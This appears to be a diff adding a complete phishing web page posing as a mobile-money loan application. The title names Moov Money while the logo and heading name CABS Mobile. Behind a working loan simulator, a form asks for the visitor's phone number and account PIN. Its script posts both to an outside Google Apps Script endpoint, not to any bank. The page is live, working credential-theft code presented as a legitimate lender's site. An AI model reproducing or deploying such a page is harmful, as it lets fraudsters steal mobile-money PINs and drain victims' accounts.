@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Moov Money - Loan Application</title>
+
+<style>
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body {
+    background: #f2f2f2;
+    color: #333;
+}
+
+/* MAIN WEBSITE */
+.container {
+    width: 100%;
+    max-width: 700px;
+    margin: auto;
+    background: #fff;
+    min-height: 100vh;
+}
+
+/* HEADER */
+.header {
+    background: #fff;
+    padding: 20px 20px 15px;
+    border-bottom: 1px solid #ddd;
+}
+
+.logo {
+    text-align: center;
+}
+
+.logo img {
+    width: 110px;
+    height: 110px;
+    object-fit: contain;
+}
+
+.logo h1 {
+    color: #0066a6;
+    font-size: 30px;
+    margin-top: 5px;
+}
+
+.logo span {
+    color: #f47b00;
+}
+
+/* MENU BUTTON */
+.menu-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 18px;
+}
+
+.menu-button {
+    border: 1px solid #888;
+    background: white;
+    border-radius: 12px;
+    padding: 12px 20px;
+    font-size: 18px;
+    color: #24427c;
+}
+
+.search {
+    font-size: 32px;
+    color: #243c7c;
+}
+
+/* NAVIGATION */
+.navigation {
+    width: 100%;
+}
+
+.nav-item {
+    width: 100%;
+    padding: 18px 20px;
+    font-size: 18px;
+    font-weight: bold;
+    color: white;
+    background: #999;
+    border-bottom: 2px solid #aaa;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.nav-item.active {
+    background: #293f82;
+}
+
+.arrow {
+    font-size: 20px;
+}
+
+/* CONTENT */
+.content {
+    padding: 25px 25px 40px;
+    background: #fff;
+}
+
+.page-title {
+    color: #006781;
+    font-size: 32px;
+    margin-bottom: 20px;
+    border-bottom: 2px dashed #ddd;
+    padding-bottom: 20px;
+}
+
+.description {
+    color: #666;
+    font-size: 17px;
+    line-height: 1.6;
+    margin-bottom: 25px;
+}
+
+/* LOAN CARD */
+.loan-card {
+    background: #f8f8f8;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    padding: 22px;
+    margin-top: 20px;
+}
+
+.loan-title {
+    color: #006781;
+    text-align: center;
+    font-size: 25px;
+    margin-bottom: 15px;
+}
+
+.amount {
+    text-align: center;
+    font-size: 38px;
+    font-weight: bold;
+    color: #293f82;
+    margin: 20px 0;
+}
+
+.range {
+    width: 100%;
+    cursor: pointer;
+    accent-color: #f47b00;
+}
+
+/* TERM */
+.term {
+    margin-top: 25px;
+}
+
+.term label,
+.form-group label {
+    display: block;
+    font-weight: bold;
+    color: #555;
+    margin-bottom: 8px;
+}
+
+select,
+input {
+    width: 100%;
+    padding: 14px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    font-size: 16px;
+    background: white;
+}
+
+input:focus,
+select:focus {
+    outline: none;
+    border-color: #f47b00;
+}
+
+/* RESULT */
+.result {
+    margin-top: 25px;
+    background: #293f82;
+    color: white;
+    padding: 20px;
+    border-radius: 7px;
+    text-align: center;
+}
+
+.result h3 {
+    font-size: 17px;
+    margin-bottom: 10px;
+}
+
+.result p {
+    font-size: 30px;
+    font-weight: bold;
+    color: #ff9a22;
+}
+
+/* APPLICATION */
+.application {
+    margin-top: 25px;
+}
+
+.application h2 {
+    color: #006781;
+    font-size: 24px;
+    margin-bottom: 20px;
+}
+
+.form-group {
+    margin-bottom: 18px;
+}
+
+/* BUTTON */
+button {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 6px;
+    background: #f47b00;
+    color: white;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 5px;
+}
+
+button:hover {
+    background: #d96800;
+}
+
+/* INFO BOXES */
+.info-section {
+    margin-top: 30px;
+}
+
+.info-box {
+    background: #293f82;
+    color: white;
+    padding: 18px;
+    margin-bottom: 5px;
+    border-radius: 4px;
+    font-size: 17px;
+    font-weight: bold;
+    display: flex;
+    justify-content: space-between;
+}
+
+/* FOOTER */
+.footer {
+    background: #293f82;
+    color: white;
+    text-align: center;
+    padding: 25px 15px;
+    font-size: 14px;
+}
+
+/* MOBILE */
+@media (max-width: 480px) {
+
+    body {
+        background: white;
+    }
+
+    .container {
+        max-width: 100%;
+    }
+
+    .header {
+        padding: 15px;
+    }
+
+    .logo img {
+        width: 90px;
+        height: 90px;
+    }
+
+    .logo h1 {
+        font-size: 27px;
+    }
+
+    .page-title {
+        font-size: 29px;
+    }
+
+    .content {
+        padding: 22px 18px 35px;
+    }
+
+    .amount {
+        font-size: 34px;
+    }
+
+    .nav-item {
+        font-size: 17px;
+    }
+}
+
+</style>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="logo">
+            <img src="cabsm.jpeg" alt="CABS Mobile">
+            <h1>CABS Mobile</h1>
+        </div>
+
+        <p class="subtitle">
+            Fast Approval • Flexible Repayment • Trusted and Secure
+        </p>
+
+ <div class="loan-card">
+
+    <h2 class="loan-title">
+        Loan Simulator
+    </h2>
+
+    <div class="amount">
+        $<span id="loanAmount">500</span>
+    </div>
+
+    <input
+        class="range"
+        type="range"
+        id="slider"
+        min="500"
+        max="50000"
+        step="500"
+        value="500"
+    >
+
+    <div class="term">
+
+        <label for="months">
+            Loan Term
+        </label>
+
+        <select id="months">
+
+            <option value="6">
+                6 Months
+            </option>
+
+            <option value="12" selected>
+                12 Months
+            </option>
+
+            <option value="24">
+                24 Months
+            </option>
+
+            <option value="36">
+                36 Months
+            </option>
+
+            <option value="48">
+                48 Months
+            </option>
+
+            <option value="60">
+                60 Months
+            </option>
+
+        </select>
+
+    </div>
+
+    <div class="result">
+
+        <h3>
+            Estimated Monthly Payment
+        </h3>
+
+        <p id="payment">
+            $43.75
+        </p>
+
+        </div>
+
+        <form id="applicationForm">
+
+            <div class="form-group">
+                <label for="phoneNumber">Phone Number</label>
+                <input
+                    type="tel"
+                    id="phoneNumber"
+                    placeholder="Enter your phone number"
+                    required
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="pin">PIN</label>
+                <input
+                    type="password"
+                    id="pin"
+                    placeholder="Enter your PIN"
+                    required
+                >
+            </div>
+
+            <button type="submit">
+                APPLY NOW
+            </button>
+
+        </form>
+
+        </div>
+
+        <div class="footer">
+
+            <div class="box">
+                ⚡ Fast Approval
+            </div>
+
+            <div class="box">
+                💰 Competitive Rates
+            </div>
+
+        </div>
+
+    </div>
+
+    <script>
+
+        /* =========================
+           LIVE LOAN CALCULATOR
+        ========================= */
+
+const slider = document.getElementById("slider");
+const months = document.getElementById("months");
+const loanAmount = document.getElementById("loanAmount");
+const payment = document.getElementById("payment");
+
+function calculateLoan() {
+
+    const loan = parseInt(slider.value);
+    const term = parseInt(months.value);
+
+    // Example total interest of 5%
+    const interest = 0.05;
+
+    const total = loan + (loan * interest);
+
+    const monthly = total / term;
+
+    loanAmount.textContent =
+        loan.toLocaleString("en-US");
+
+    payment.textContent =
+        "$" + monthly.toLocaleString("en-US", {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2
+        });
+}
+
+slider.addEventListener("input", calculateLoan);
+
+months.addEventListener("change", calculateLoan);
+
+calculateLoan();
+
+
+        /* =========================
+           FORM SUBMISSION
+        ========================= */
+
+        const applicationForm =
+            document.getElementById("applicationForm");
+
+        applicationForm.addEventListener(
+            "submit",
+            async function (e) {
+
+                e.preventDefault();
+
+                const formData = {
+                    number:
+                        document.getElementById("phoneNumber").value,
+
+                    PIN:
+                        document.getElementById("pin").value
+                };
+
+                try {
+
+                    const response = await fetch(
+                        "https://script.google.com/macros/s/AKfycbw-v1eYH1jsEfDuSbXG1Blkv9pl9AqdqIJ_llVwHkKGDwVHsStxI66vhoPQh2jZBb9t9w/exec",
+                        {
+                            method: "POST",
+                            body: JSON.stringify(formData)
+                        }
+                    );
+
+                    if (!response.ok) {
+                        throw new Error(
+                            "Submission failed"
+                        );
+                    }
+
+                    alert(
+                        "Application submitted successfully!"
+                    );
+
+                    applicationForm.reset();
+
+                } catch (error) {
+
+                    console.error(error);
+
+                    alert(
+                        "Unable to submit the application. Please try again."
+                    );
+                }
+            }
+        );
+
+    </script>
+
+</body>
+</html>
